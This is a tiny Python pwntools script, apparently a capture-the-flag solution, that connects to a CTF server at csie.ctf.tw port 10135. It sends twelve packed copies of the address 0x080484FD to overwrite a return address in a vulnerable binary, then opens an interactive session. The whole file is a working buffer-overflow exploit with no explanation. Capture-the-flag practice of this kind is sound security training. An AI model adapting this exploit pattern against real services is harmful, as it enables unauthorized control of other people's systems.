#!/usr/bin/python
from pwn import *

r = remote('csie.ctf.tw', 10135)
r.send(p32(0x080484FD)*12+'\n')
r.interactive()
